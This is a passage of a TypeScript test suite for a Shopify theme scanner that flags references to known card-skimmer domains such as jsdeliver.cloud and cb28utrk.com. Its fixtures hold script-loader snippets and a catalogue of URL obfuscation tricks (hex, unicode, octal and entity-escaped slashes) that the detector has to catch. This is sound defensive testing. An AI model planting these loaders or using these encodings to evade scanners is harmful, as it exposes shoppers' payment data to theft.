    expect(detectMaliciousScripts(file)).toHaveLength(0);
  });

  it("matches the bare domain, protocol-relative URLs, and is case-insensitive", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<script src="https://jsdeliver.cloud/a.js"></script>',
        '<script src="//SHOPIFY.JSDELIVER.CLOUD/config.js"></script>',
      ].join("\n"),
    };
    const findings = detectMaliciousScripts(file);
    expect(findings.map((f) => f.lineNumber)).toEqual([1, 2]);
  });

  it("catches dynamic injection (URL in inline JS, not a src attribute)", () => {
    const file: ThemeFile = {
      filename: "snippets/loader.liquid",
      content: [
        "<script>",
        "  var s = document.createElement('script');",
        "  s.src = 'https://shopify.jsdeliver.cloud/config.js';",
        "  document.head.appendChild(s);",
        "</script>",
      ].join("\n"),
    };
    const findings = detectMaliciousScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(3);
  });

  it("emits one finding per line even if the domain appears twice on it", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<link rel="preload" href="https://shopify.jsdeliver.cloud/config.js"><script src="https://shopify.jsdeliver.cloud/config.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(1);
  });

  it("skips references inside a Liquid comment block (inert code)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}",
        '<script src="https://shopify.jsdeliver.cloud/config.js"></script>',
        "{% endcomment %}",
      ].join("\n"),
    };
    expect(detectMaliciousScripts(file)).toHaveLength(0);
  });

  it("stays HIGH for a live line directly after a comment block (no snippet-context downgrade)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        "{% comment %}note{% endcomment %}",
        "",
        '<script src="https://shopify.jsdeliver.cloud/config.js"></script>',
      ].join("\n"),
    };
    const findings = detectMaliciousScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.HIGH);
  });

  it("flags the hijacked cb28utrk.com skimmer domain (Netcraft-reported)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<script src="https://www.cb28utrk.com/scripts/shopify/click.js?nid=733&intid=1&shop=x.myshopify.com"></script>',
    };
    const findings = detectMaliciousScripts(file);
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain("cb28utrk.com");
  });

  // ---- Adversarial-audit regressions (2026-09-23) ----

  it("keeps the malicious URL visible in the snippet preview even with a preceding line", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<meta name="viewport" content="width=device-width,initial-scale=1">',
        `<script>${"x".repeat(500)}</script><script src="https://shopify.jsdeliver.cloud/config.js"></script>`,
      ].join("\n"),
    };
    const [f] = detectMaliciousScripts(file);
    // FindingRow previews the first 80 chars; the domain must be inside them.
    expect(f.codeSnippet.slice(0, 80)).toContain("jsdeliver.cloud");
    expect(f.codeSnippet.length).toBeLessThanOrEqual(300);
  });

  it("detects code on the same line as an inline Liquid comment (no whole-line skip)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '{% comment %}note{% endcomment %}<script src="https://shopify.jsdeliver.cloud/config.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(1);
  });

  it("detects code BEFORE a comment opener on the same line", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<script src="https://shopify.jsdeliver.cloud/config.js"></script>{% comment %}',
        "still commented",
        "{% endcomment %}",
      ].join("\n"),
    };
    expect(detectMaliciousScripts(file).map((f) => f.lineNumber)).toEqual([1]);
  });

  it("still ignores a reference that is inside a whitespace-control comment block", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '{%- comment -%}<script src="https://shopify.jsdeliver.cloud/config.js"></script>{%- endcomment -%}',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(0);
  });

  it("detects JSON-escaped slashes (https:\\/\\/)", () => {
    const file: ThemeFile = {
      filename: "snippets/loader.liquid",
      content: '<script>var u = "https:\\/\\/shopify.jsdeliver.cloud\\/config.js";</script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(1);
  });

  it("detects a userinfo-prefixed host (https://x@evil)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<script src="https://cdn@shopify.jsdeliver.cloud/config.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(1);
  });

  it("detects a trailing-dot FQDN and keeps it out of the unknown-script flywheel", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<script src="https://jsdeliver.cloud./x.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(1);
    expect(collectUnknownScripts(file)).toHaveLength(0);
  });

  it("emits one finding per DISTINCT malicious domain on the same line", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content:
        '<script src="https://shopify.jsdeliver.cloud/a.js"></script><script src="https://www.cb28utrk.com/scripts/shopify/click.js"></script>',
    };
    const findings = detectMaliciousScripts(file);
    expect(findings).toHaveLength(2);
    expect(findings[0].description).toContain("jsdeliver.cloud");
    expect(findings[1].description).toContain("cb28utrk.com");
  });

  it("describes a reference, not a confirmed load (it may be inert, e.g. an HTML comment)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<!-- <script src="https://shopify.jsdeliver.cloud/config.js"></script> -->',
    };
    const [f] = detectMaliciousScripts(file);
    expect(f.description).toMatch(/^References known-malicious domain jsdeliver\.cloud/);
  });

  it("stays linear on a pathological 1MB single line (no ReDoS)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: "//" + "a".repeat(1_000_000) + " //" + "a.".repeat(400_000),
    };
    expect(timedMinMs(() => detectMaliciousScripts(file))).toBeLessThan(1500);
  });

  it("returns nothing for a clean file", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: '<script src="https://www.17track.net/externalcall.js"></script>',
    };
    expect(detectMaliciousScripts(file)).toHaveLength(0);
  });

  it("keeps malicious hosts OUT of the unknown-script/stylesheet flywheel (never ask a merchant to name malware)", () => {
    const file: ThemeFile = {
      filename: "layout/theme.liquid",
      content: [
        '<script src="https://shopify.jsdeliver.cloud/config.js"></script>',
        '<link rel="stylesheet" href="https://shopify.jsdeliver.cloud/x.css">',
        '<script src="https://cdn.unknown-vendor.example/widget.js"></script>',
      ].join("\n"),
    };
    expect(collectUnknownScripts(file).map((u) => u.url)).toEqual([
      "https://cdn.unknown-vendor.example/widget.js",
    ]);
    expect(collectUnknownStylesheets(file)).toHaveLength(0);
  });

  it("is wired into scanThemeFiles and removed from unknownScripts", () => {
    const { findings, unknownScripts } = scanThemeFiles([
      { filename: "sections/a-dependencies.liquid", content: INJECTED },
    ]);
    expect(findingsOfType(findings, FindingType.MALICIOUS_SCRIPT)).toHaveLength(1);
    expect(unknownScripts.some((u) => u.url.includes("jsdeliver.cloud"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// MALICIOUS_SCRIPT beyond the Liquid scan surface (gc-3pd)
// ---------------------------------------------------------------------------

describe("isMaliciousScanOnlyFile", () => {
  it("accepts the malicious-only globs (JSON templates/sections, settings_data, asset JS/Liquid)", () => {
    expect(isMaliciousScanOnlyFile("templates/product.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("templates/customers/account.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("sections/header-group.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("config/settings_data.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("assets/app.js")).toBe(true);
    expect(isMaliciousScanOnlyFile("assets/theme.js.liquid")).toBe(true);
  });

  it("accepts locales and ES-module assets (audit round 2)", () => {
    expect(isMaliciousScanOnlyFile("locales/en.default.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("locales/fr.json")).toBe(true);
    expect(isMaliciousScanOnlyFile("assets/app.mjs")).toBe(true);
    // Only the file types Shopify stores there as text/code.
    expect(isMaliciousScanOnlyFile("blocks/readme.md")).toBe(false);
    expect(isMaliciousScanOnlyFile("locales/en.txt")).toBe(false);
  });

  it("rejects blocks/*.liquid: theme blocks get the FULL detector suite now (gc-zfl)", () => {
    expect(isMaliciousScanOnlyFile("blocks/custom-code.liquid")).toBe(false);
    expect(isMaliciousScanOnlyFile("blocks/_nested-private.liquid")).toBe(false);
  });

  it("never overlaps isScannableFile (no file gets the malicious pass twice)", () => {
    for (const f of [
      "blocks/custom-code.liquid",
      "locales/en.default.json",
      "assets/app.mjs",
      "assets/app.js",
      "assets/theme.js.liquid",
      "templates/product.json",
      "sections/header-group.json",
      "config/settings_data.json",
      "templates/index.liquid",
      "sections/header.liquid",
      "snippets/x.liquid",
      "layout/theme.liquid",
    ]) {
      expect(isMaliciousScanOnlyFile(f) && isScannableFile(f), f).toBe(false);
    }
  });

  it("rejects files the full detector suite already scans (no double-run)", () => {
    expect(isMaliciousScanOnlyFile("templates/index.liquid")).toBe(false);
    expect(isMaliciousScanOnlyFile("sections/header.liquid")).toBe(false);
    expect(isMaliciousScanOnlyFile("snippets/loader.liquid")).toBe(false);
    expect(isMaliciousScanOnlyFile("layout/theme.liquid")).toBe(false);
    expect(isMaliciousScanOnlyFile("blocks/custom-code.liquid")).toBe(false);
  });

  it("rejects files outside the globs (CSS, settings schema, empty)", () => {
    expect(isMaliciousScanOnlyFile("assets/app.css")).toBe(false);
    expect(isMaliciousScanOnlyFile("config/settings_schema.json")).toBe(false);
    expect(isMaliciousScanOnlyFile("assets/logo.svg")).toBe(false);
    expect(isMaliciousScanOnlyFile("")).toBe(false);
  });
});

describe("scanThemeFiles — MALICIOUS_SCRIPT in non-Liquid theme files (gc-3pd)", () => {
  const EVIL = "https://shopify.jsdeliver.cloud/config.js";

  // Custom Liquid block code as Shopify stores it in a JSON template: the block
  // HTML is a JSON string, so its quotes and slashes arrive escaped.
  const PRODUCT_JSON = String.raw`/*
 * IMPORTANT: The contents of this file are auto-generated.
 */
{
  "sections": {
    "custom_liquid_abc": {
      "type": "custom-liquid",
      "settings": {
        "custom_liquid": "<script src=\"https:\/\/shopify.jsdeliver.cloud\/config.js\" async><\/script>"
      }
    }
  },
  "order": ["custom_liquid_abc"]
}`;

  function maliciousFor(file: ThemeFile) {
    return findingsOfType(scanThemeFiles([file]).findings, FindingType.MALICIOUS_SCRIPT);
  }

  it("flags a malicious loader in assets/*.js with the correct line", () => {
    const [f, ...rest] = maliciousFor({
      filename: "assets/app.js",
      content: [
        "(function () {",
        "  var s = document.createElement('script');",
        `  s.src = '${EVIL}';`,
        "  document.head.appendChild(s);",
        "})();",
      ].join("\n"),
    });
    expect(rest).toHaveLength(0);
    expect(f.filename).toBe("assets/app.js");
    expect(f.lineNumber).toBe(3);
    expect(f.severity).toBe(Severity.HIGH);
  });

  it("flags a malicious loader in assets/*.js.liquid", () => {
    const findings = maliciousFor({
      filename: "assets/theme.js.liquid",
      content: `var shop = {{ shop.permanent_domain | json }};\nimport("${EVIL}");`,
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("assets/theme.js.liquid");
    expect(findings[0].lineNumber).toBe(2);
  });

  it("flags a Custom Liquid block in templates/*.json (escaped quotes + slashes)", () => {
    const findings = maliciousFor({ filename: "templates/product.json", content: PRODUCT_JSON });
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("templates/product.json");
    expect(findings[0].lineNumber).toBe(9);
    expect(findings[0].codeSnippet).toContain("jsdeliver.cloud");
  });

  it("flags a Custom Liquid block in a sections/*.json section group", () => {
    const findings = maliciousFor({
      filename: "sections/header.json",
      content: PRODUCT_JSON.replace(/^[\s\S]*?\*\/\n/, ""),
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("sections/header.json");
    expect(findings[0].lineNumber).toBe(6);
  });

  it("flags a malicious URL stored in config/settings_data.json", () => {
    const findings = maliciousFor({
      filename: "config/settings_data.json",
      content: [
        "{",
        '  "current": {',
        String.raw`    "custom_head_code": "<script src=\"https:\/\/www.cb28utrk.com\/scripts\/shopify\/click.js\"><\/script>"`,
        "  }",
        "}",
      ].join("\n"),
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].filename).toBe("config/settings_data.json");
    expect(findings[0].lineNumber).toBe(3);
    expect(findings[0].description).toContain("cb28utrk.com");
  });

  it("does not flag the real jsDelivr CDN in assets/vendor.js", () => {
    const { findings } = scanThemeFiles([
      {
        filename: "assets/vendor.js",
        content: 'import("https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js");',
      },
    ]);
    expect(findings).toHaveLength(0);
  });

  it("does not scan files outside the globs (assets/*.css)", () => {
    const { findings } = scanThemeFiles([
      { filename: "assets/app.css", content: `@import url("${EVIL}");` },
    ]);
    expect(findings).toHaveLength(0);
  });

  it("flags malicious references in locales/*.json, blocks/*.liquid and assets/*.mjs", () => {
    const { findings } = scanThemeFiles([
      // `_html` locale keys render unescaped on the storefront.
      {
        filename: "locales/en.default.json",
        content: `{\n  "general": {\n    "banner_html": "<script src=\\"${EVIL}\\"></script>"\n  }\n}`,
      },
      {
        filename: "blocks/custom-code.liquid",
        content: `<div>\n<script src="${EVIL}"></script>\n</div>`,
      },
      { filename: "assets/loader.mjs", content: `export default import("${EVIL}");` },
    ]);
    expect(findings.map((f) => [f.findingType, f.filename, f.lineNumber])).toEqual([
      [FindingType.MALICIOUS_SCRIPT, "locales/en.default.json", 3],
      [FindingType.MALICIOUS_SCRIPT, "blocks/custom-code.liquid", 2],
      [FindingType.MALICIOUS_SCRIPT, "assets/loader.mjs", 1],
    ]);
  });

  it("reports a malicious reference in blocks/*.liquid exactly once (full suite, gc-zfl)", () => {
    const findings = maliciousFor({
      filename: "blocks/custom-code.liquid",
      content: `<div>\n<script src="${EVIL}"></script>\n</div>`,
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(2);
  });

  it("stays linear on a comment-opener flood in a .liquid file (blanking path)", () => {
    const content = "{% comment %}".repeat(40_000) + `\n<script src="${EVIL}"></script>`;
    const { result: findings, minMs } = timedMinMsWithResult(() =>
      detectMaliciousScripts({ filename: "blocks/x.liquid", content }),
    );
    expect(minMs).toBeLessThan(1500);
    expect(findings).toHaveLength(1);
  });

  it("runs ONLY the malicious detector on these files (no other detector fires)", () => {
    // A ghost-script tag + an otherwise-flaggable meta tag in an asset: the full
    // suite would flag them in a .liquid template, but asset files get only the
    // malicious-domain pass.
    const { findings, unknownScripts, thirdPartyDomains } = scanThemeFiles([
      {
        filename: "assets/theme.js.liquid",
        content: [
          '<script src="https://static.klaviyo.com/onsite/js/klaviyo.js?company_id=X"></script>',
          '<meta name="robots" content="noindex">',
          `<script src="${EVIL}"></script>`,
        ].join("\n"),
      },
    ]);
    expect(findings.map((f) => f.findingType)).toEqual([FindingType.MALICIOUS_SCRIPT]);
    expect(unknownScripts).toHaveLength(0);
    expect(thirdPartyDomains).toHaveLength(0);
  });

  it("does not double-count a malicious line in a normal scannable file", () => {
    const findings = maliciousFor({
      filename: "layout/theme.liquid",
      content: `<script src="${EVIL}"></script>`,
    });
    expect(findings).toHaveLength(1);
  });

  it("stays fast on a realistic large theme (300 x ~200KB assets, minified single-line JS)", () => {
    // Minified bundles are one enormous line full of URLs, `//` and escaped
    // slashes: the worst realistic shape for the per-line URL pass.
    const minifiedChunk =
      'function a(b){return b&&"https:\\/\\/cdn.shopify.com\\/s\\/files\\/x.js"}var c=document.createElement("script");c.src="//cdn.jsdelivr.net/npm/x@1/x.min.js";/*{% comment %}*/';
    const multiLineChunk =
      'import { x } from "./x.js";\n// https://example.com/docs\nexport const y = x;\n';
    const files: ThemeFile[] = [];
    for (let i = 0; i < 300; i++) {
      const chunk = i % 2 === 0 ? minifiedChunk : multiLineChunk;
      files.push({
        filename: `assets/bundle-${i}.js`,
        content: chunk.repeat(Math.ceil(200_000 / chunk.length)),
      });
    }
    files.push({ filename: "assets/zzz.js", content: `s.src="${EVIL}";` });

    const { result, minMs } = timedMinMsWithResult(() => scanThemeFiles(files));

    expect(findingsOfType(result.findings, FindingType.MALICIOUS_SCRIPT)).toHaveLength(1);
    // Min of two runs discards a transient stall under full-suite parallelism;
    // the extended timeout gives room for two runs of a scan that is itself
    // well under a second in isolation.
    expect(minMs).toBeLessThan(10_000);
  }, 30_000);

  it("stays linear on a Liquid comment-opener flood with no closer (no ReDoS)", () => {
    // `{% comment %}` x ~40k with no `{% endcomment %}`: a lazy whole-file
    // comment regex rescans to EOF from every opener (quadratic, ~minutes).
    const content = "{% comment %}".repeat(40_000) + `\n<script src="${EVIL}"></script>`;
    const { result: findings, minMs } = timedMinMsWithResult(() =>
      detectMaliciousScripts({ filename: "assets/app.js", content }),
    );
    expect(minMs).toBeLessThan(1500);
    // Unterminated comment never closes, so the live line after it still counts.
    expect(findings).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// MALICIOUS_SCRIPT adversarial-audit round 2 (2026-09-23b)
// ---------------------------------------------------------------------------

describe("detectMaliciousScripts — Liquid comments only count in .liquid files", () => {
  it("flags a reference wrapped in literal {% comment %} text inside assets/*.js", () => {
    // Liquid never renders assets/*.js, so the tags are plain JS comment text.
    const findings = detectMaliciousScripts({
      filename: "assets/theme.js",
      content: '/*{% comment %}*/ s.src="https://jsdeliver.cloud/x.js"; /*{% endcomment %}*/',
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(1);
  });

  it("flags a Custom Liquid block between comment tags split across two JSON block settings", () => {
    const content = [
      "{",
      '  "sections": {',
      '    "a": { "type": "rich-text", "settings": { "text": "{% comment %}" } },',
      String.raw`    "b": { "type": "custom-liquid", "settings": { "custom_liquid": "<script src=\"https:\/\/jsdeliver.cloud\/x.js\"><\/script>" } },`,
      '    "c": { "type": "rich-text", "settings": { "text": "{% endcomment %}" } }',
      "  },",
      '  "order": ["a", "b", "c"]',
      "}",
    ].join("\n");
    const findings = findingsOfType(
      scanThemeFiles([{ filename: "templates/index.json", content }]).findings,
      FindingType.MALICIOUS_SCRIPT,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].lineNumber).toBe(4);
  });

  it("flags literal comment tags in config/settings_data.json and locales/*.json", () => {
    const content =
      '{ "x": "{% comment %}", "y": "<script src=\\"https://jsdeliver.cloud/x.js\\">", "z": "{% endcomment %}" }';
    for (const filename of ["config/settings_data.json", "locales/en.default.json"]) {
      expect(detectMaliciousScripts({ filename, content })).toHaveLength(1);
    }
  });

  it("still blanks Liquid comments in assets/*.js.liquid and *.css.liquid (Liquid renders them)", () => {
    for (const filename of ["assets/theme.js.liquid", "assets/theme.css.liquid"]) {
      const findings = detectMaliciousScripts({
        filename,
        content: '{% comment %}s.src="https://jsdeliver.cloud/x.js";{% endcomment %}',
      });
      expect(findings).toHaveLength(0);
    }
  });
});

describe("detectMaliciousScripts — {% raw %} blocks", () => {
  const EVIL_TAG = '<script src="https://jsdeliver.cloud/x.js"></script>';

  it("ignores comment tags that are literal text inside raw blocks (script renders live)", () => {
    const findings = detectMaliciousScripts({
      filename: "sections/x.liquid",
      content: `{% raw %}{% comment %}{% endraw %}${EVIL_TAG}{% raw %}{% endcomment %}{% endraw %}`,
    });
    expect(findings).toHaveLength(1);
  });

  it("handles whitespace-control raw tags ({%- raw -%})", () => {
    const findings = detectMaliciousScripts({
      filename: "sections/x.liquid",
      content: `{%- raw -%}{%- comment -%}{%- endraw -%}\n${EVIL_TAG}\n{%- raw -%}{%- endcomment -%}{%- endraw -%}`,
    });
    expect(findings.map((f) => f.lineNumber)).toEqual([2]);
  });

  it("still blanks a real comment that contains a raw block", () => {
    const findings = detectMaliciousScripts({
      filename: "sections/x.liquid",
      content: `{% comment %}{% raw %}${EVIL_TAG}{% endraw %}{% endcomment %}`,
    });
    expect(findings).toHaveLength(0);
  });

  it("still blanks a real comment that follows a closed raw block", () => {
    const findings = detectMaliciousScripts({
      filename: "sections/x.liquid",
      content: `{% raw %}{{ x }}{% endraw %}{% comment %}${EVIL_TAG}{% endcomment %}`,
    });
    expect(findings).toHaveLength(0);
  });

  it("treats everything after an unterminated raw as live (fails toward reporting)", () => {
    const findings = detectMaliciousScripts({
      filename: "sections/x.liquid",
      content: `{% raw %}{% comment %}${EVIL_TAG}{% endcomment %}`,
    });
    expect(findings).toHaveLength(1);
  });

  it("stays linear on raw/comment tag floods in a .liquid file", () => {
    const floods = [
      "{% comment %}".repeat(40_000),
      "{% raw %}".repeat(40_000),
      "{% raw %}{% endraw %}{% comment %}".repeat(20_000),
      "{% comment %}{% raw %}".repeat(20_000),
      "{%" + " ".repeat(500_000) + "raw",
    ];
    for (const flood of floods) {
      expect(
        timedMinMs(() =>
          detectMaliciousScripts({
            filename: "sections/x.liquid",
            content: `${flood}\n${EVIL_TAG}`,
          }),
        ),
      ).toBeLessThan(1500);
    }
  }, 30_000);
});

describe("detectMaliciousScripts — snippet and decoding", () => {
  it("centres the snippet on the first LIVE occurrence, not one inside a comment", () => {
    const [f, ...rest] = detectMaliciousScripts({
      filename: "layout/theme.liquid",
      content: `{% comment %}<script src="https://jsdeliver.cloud/a.js"></script>{% endcomment %}${"x".repeat(400)}<script src="https://jsdeliver.cloud/live.js"></script>`,
    });
    expect(rest).toHaveLength(0);
    expect(f.codeSnippet).toContain("live.js");
    expect(f.codeSnippet).not.toContain("a.js");
  });

  it("decodes HTML-entity slashes (&#47; and &#x2F;)", () => {
    for (const url of [
      "https:&#47;&#47;jsdeliver.cloud&#47;x.js",
      "https:&#x2F;&#x2F;jsdeliver.cloud&#x2F;x.js",
      "https:&#X2f;&#x2f;jsdeliver.cloud/x.js",
    ]) {
      const findings = detectMaliciousScripts({
        filename: "layout/theme.liquid",
        content: `<script src="${url}"></script>`,
      });
      expect(findings, url).toHaveLength(1);
    }
  });

  it("decodes the HTML named entity &sol; (case-sensitive, requires the semicolon)", () => {
    const scanUrl = (url: string) =>
      detectMaliciousScripts({
        filename: "layout/theme.liquid",
        content: `<script src="${url}"></script>`,
      });
    expect(scanUrl("https:&sol;&sol;jsdeliver.cloud&sol;x.js")).toHaveLength(1);
    // Browsers only decode the exact lowercase, semicolon-terminated form.
    expect(scanUrl("https:&Sol;&SOL;jsdeliver.cloud/x.js")).toHaveLength(0);
    expect(scanUrl("https:&sol&sol jsdeliver.cloud/x.js")).toHaveLength(0);
  });

  it("collapses runs of backslashes before a slash (\\\\/ and \\\\\\/)", () => {
    for (const url of [
      String.raw`https:\\/\\/jsdeliver.cloud\\/x.js`,
      String.raw`https:\\\/\\\/jsdeliver.cloud\\\/x.js`,
    ]) {
      const findings = detectMaliciousScripts({
        filename: "assets/app.js",
        content: `s.src="${url}";`,
      });
      expect(findings, url).toHaveLength(1);
    }
  });

  it("decodes JS/JSON unicode-escaped slashes (\\u002f, case-insensitive hex)", () => {
    for (const url of [
      String.raw`https:\u002f\u002fjsdeliver.cloud\u002fx.js`,
      String.raw`https:\u002F\u002Fjsdeliver.cloud\u002Fx.js`,
      String.raw`https:\\u002f\\u002fjsdeliver.cloud/x.js`,
    ]) {
      const findings = detectMaliciousScripts({
        filename: "assets/app.js",
        content: `var u = "${url}";`,
      });
      expect(findings, url).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    }
  });

  it("stays linear on a \\u002f flood and a bare \\u flood (no ReDoS in the decode)", () => {
    for (const content of [
      String.raw`\u002f`.repeat(300_000),
      String.raw`\u`.repeat(500_000) + "x",
      String.raw`\u002`.repeat(300_000),
    ]) {
      expect(
        timedMinMs(() => detectMaliciousScripts({ filename: "assets/app.js", content })),
      ).toBeLessThan(1500);
    }
  }, 30_000);

  it("stays linear on a 1MB backslash run and an entity flood (no ReDoS in the decode)", () => {
    for (const content of [
      "\\".repeat(1_000_000) + "x",
      "&#0".repeat(300_000) + "&#x0".repeat(300_000),
    ]) {
      expect(
        timedMinMs(() => detectMaliciousScripts({ filename: "assets/app.js", content })),
      ).toBeLessThan(1500);
    }
  }, 30_000);

  it("decodes JS hex-escaped slashes (\\x2f, uppercase F, doubled backslash)", () => {
    for (const url of [
      String.raw`https:\x2f\x2fshopify.jsdeliver.cloud\x2fconfig.js`,
      String.raw`https:\x2F\x2Fshopify.jsdeliver.cloud\x2Fconfig.js`,
      String.raw`https:\\x2f\\x2fshopify.jsdeliver.cloud/config.js`,
    ]) {
      const findings = detectMaliciousScripts({
        filename: "assets/app.js",
        content: `var u = "${url}";`,
      });
      expect(findings, url).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    }
  });

  it("decodes JS code-point-escaped slashes (\\u{2f}, with/without leading zeros, uppercase F, doubled backslash)", () => {
    for (const url of [
      String.raw`https:\u{2f}\u{2f}shopify.jsdeliver.cloud\u{2f}config.js`,
      String.raw`https:\u{00002f}\u{00002f}shopify.jsdeliver.cloud\u{00002f}config.js`,
      String.raw`https:\u{2F}\u{2F}shopify.jsdeliver.cloud\u{2F}config.js`,
      String.raw`https:\\u{2f}\\u{2f}shopify.jsdeliver.cloud/config.js`,
    ]) {
      const findings = detectMaliciousScripts({
        filename: "assets/app.js",
        content: `var u = "${url}";`,
      });
      expect(findings, url).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    }
  });

  it("does not decode invalid, unterminated, or unrelated hex/code-point escapes into a false slash match", () => {
    const scanUrl = (url: string) =>
      detectMaliciousScripts({
        filename: "assets/app.js",
        content: `var u = "${url}";`,
      });
    // \x2g is not a valid hex escape ('g' isn't hex) — must not decode as a slash.
    expect(scanUrl(String.raw`https:\x2g\x2gshopify.jsdeliver.cloud\x2gconfig.js`)).toHaveLength(0);
    // \u{2g} is not valid hex — must not decode.
    expect(
      scanUrl(String.raw`https:\u{2g}\u{2g}shopify.jsdeliver.cloud\u{2g}config.js`),
    ).toHaveLength(0);
    // \u{2f with no closing brace is unterminated — must not decode.
    expect(scanUrl(String.raw`https:\u{2fshopify.jsdeliver.cloud\u{2fconfig.js`)).toHaveLength(0);
    // \x2e is a real, DIFFERENT escape (decodes to '.' in real JS) — must not be
    // mistaken for a slash, which would create a false "//" and a false match.
    expect(scanUrl(String.raw`https:\x2e\x2eshopify.jsdeliver.cloud\x2econfig.js`)).toHaveLength(0);
  });

  it("stays linear on 1MB floods of \\x, \\u{, an unterminated long zero run inside \\u{, and alternating forms (no ReDoS in the decode)", () => {
    for (const content of [
      String.raw`\x`.repeat(500_000),
      String.raw`\u{`.repeat(333_334),
      String.raw`\u{` + "0".repeat(1_000_000),
      (String.raw`\x2f` + String.raw`\u{2f}`).repeat(100_000),
    ]) {
      expect(
        timedMinMs(() => detectMaliciousScripts({ filename: "assets/app.js", content })),
      ).toBeLessThan(1500);
    }
  }, 30_000);

  it("decodes code-point slash escapes with any number of leading zeros (5 and 50), as real JS does", () => {
    for (const zeros of [5, 50]) {
      const slash = String.raw`\u{` + "0".repeat(zeros) + "2f}";
      // Sanity: real JS evaluates this escape to "/".
      expect(new Function(`return "${slash}";`)()).toBe("/");
      const findings = detectMaliciousScripts({
        filename: "assets/app.js",
        content: `var u = "https:${slash}${slash}shopify.jsdeliver.cloud${slash}config.js";`,
      });
      expect(findings, `${zeros} zeros`).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    }
  });

  // Legacy octal escapes (sloppy-mode inline JS): a backslash then 57 or 057 is
  // "/". Per the spec a 4-7 lead digit takes ONE more octal digit and a 0-3
  // lead takes up to TWO, so "backslash 5 7 7" is "/7" and "backslash 0 5 7 7"
  // is "/7" as well; only the lead digits decide, never a trailing digit.
  const evalSloppy = (literal: string): string => new Function(`return "${literal}";`)() as string;
  const scanOctal = (url: string) =>
    detectMaliciousScripts({ filename: "assets/app.js", content: `var u = "${url}";` });

  it("decodes legacy octal slash escapes (backslash 57 and backslash 057)", () => {
    expect(evalSloppy(String.raw`\57`)).toBe("/");
    expect(evalSloppy(String.raw`\057`)).toBe("/");
    for (const url of [
      String.raw`https:\57\57shopify.jsdeliver.cloud\57config.js`,
      String.raw`https:\057\057shopify.jsdeliver.cloud\057config.js`,
      String.raw`https:\\57\\57shopify.jsdeliver.cloud/config.js`,
    ]) {
      const findings = scanOctal(url);
      expect(findings, url).toHaveLength(1);
      expect(findings[0].findingType).toBe(FindingType.MALICIOUS_SCRIPT);
    }
  });

  it("decodes an octal slash followed by another digit, as real JS does (backslash 577 is slash then 7)", () => {
    const url = String.raw`https:\57\5770.jsdeliver.cloud/x.js`;
    expect(evalSloppy(url)).toBe("https://70.jsdeliver.cloud/x.js");
    expect(scanOctal(url)).toHaveLength(1);
    const url3 = String.raw`https:\057\05770.jsdeliver.cloud/x.js`;
    expect(evalSloppy(url3)).toBe("https://70.jsdeliver.cloud/x.js");
    expect(scanOctal(url3)).toHaveLength(1);
  });

  it("does not decode non-slash octal escapes into a false slash match", () => {
    for (const url of [
      String.raw`https:\58\58jsdeliver.cloud/x.js`, // \5 then "8"
      String.raw`https:\0057\0057jsdeliver.cloud/x.js`, // \005 then "7"
      String.raw`https:\157\157jsdeliver.cloud/x.js`, // "o"
      String.raw`https:\5\5jsdeliver.cloud/x.js`,
    ]) {
      expect(evalSloppy(url), url).not.toContain("//");
      expect(scanOctal(url), url).toHaveLength(0);
    }
  });

  it("stays linear on 5MB floods of backslash-0, backslash-5 and backslash-05", () => {
    for (const unit of [String.raw`\0`, String.raw`\5`, String.raw`\05`, String.raw`\\0`]) {
      const content = unit.repeat(Math.ceil(5_000_000 / unit.length));
      expect(
        timedMinMs(() => detectMaliciousScripts({ filename: "assets/app.js", content })),
      ).toBeLessThan(1500);
    }
  }, 30_000);

  it("stays linear on a 5MB unterminated zero run and repeated zero-run starts inside \\u{", () => {
    for (const content of [
